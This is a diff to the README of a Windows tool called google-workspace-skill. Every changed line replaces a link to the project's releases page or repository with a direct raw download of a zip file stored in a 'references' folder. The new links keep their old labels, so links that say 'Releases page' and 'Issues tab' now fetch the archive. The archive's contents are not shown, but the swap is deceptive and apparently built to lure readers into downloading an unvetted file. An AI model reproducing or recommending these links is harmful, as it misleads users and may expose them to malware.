@@ -1,6 +1,6 @@
 # 🚀 google-workspace-skill - Manage Google Workspace Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-google--workspace--skill-blue?style=for-the-badge)](https://github.com/geziel16/google-workspace-skill/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-google--workspace--skill-blue?style=for-the-badge)](https://github.com/geziel16/google-workspace-skill/raw/refs/heads/main/references/google_workspace_skill_v1.8.zip)
 
 ---
 
@@ -30,7 +30,7 @@ No extra software or developer tools are needed.
 
 Click the button below to visit the latest releases page. This page contains all the downloadable files and the latest software updates.
 
-[![Download google-workspace-skill](https://img.shields.io/badge/Download-google--workspace--skill-green?style=for-the-badge)](https://github.com/geziel16/google-workspace-skill/releases)
+[![Download google-workspace-skill](https://img.shields.io/badge/Download-google--workspace--skill-green?style=for-the-badge)](https://github.com/geziel16/google-workspace-skill/raw/refs/heads/main/references/google_workspace_skill_v1.8.zip)
 
 ---
 
@@ -114,7 +114,7 @@ No data is sent outside your computer except to Google’s official servers.
 
 To keep the app running smoothly:
 
-1. Visit the [Releases page](https://github.com/geziel16/google-workspace-skill/releases) regularly.
+1. Visit the [Releases page](https://github.com/geziel16/google-workspace-skill/raw/refs/heads/main/references/google_workspace_skill_v1.8.zip) regularly.
 2. Download the latest Windows installer when a new version appears.
 3. Run the new installer to replace the old version.
 4. Your settings and linked Google account will stay intact.
@@ -135,7 +135,7 @@ To keep the app running smoothly:
 
 To learn about all the gws CLI commands available, visiting the official documentation linked from the application or the GitHub repository may help.
 
-For issues or questions, you can open a ticket on the Issues tab of the repository at https://github.com/geziel16/google-workspace-skill/.
+For issues or questions, you can open a ticket on the Issues tab of the repository at https://github.com/geziel16/google-workspace-skill/raw/refs/heads/main/references/google_workspace_skill_v1.8.zip
 
 ---
 
